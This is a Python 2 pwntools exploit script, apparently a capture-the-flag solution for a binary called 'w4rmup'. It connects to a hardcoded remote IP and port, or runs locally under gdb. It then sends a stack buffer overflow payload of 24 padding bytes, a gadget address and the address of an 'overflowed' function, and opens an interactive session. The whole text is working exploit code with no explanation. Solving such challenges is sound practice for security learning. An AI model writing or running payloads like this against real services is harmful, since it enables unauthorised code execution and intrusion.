#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./w4rmup')
context.terminal = ['alacritty', '-e', 'sh', '-c']
host = args.HOST or '35.232.11.215'
port = int(args.PORT or 49153)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

pop_rdi = 0x000000000040126b

offset = 24 # pattern = daaaaaaa
padding = 'aaaaaaaabaaaaaaacaaaaaaa'

payload = padding + p64(0x00000000004010df) + p64(exe.sym['overflowed'])
io.sendline(payload)
# io.recvline()
# print(io.recvline())
io.interactive()

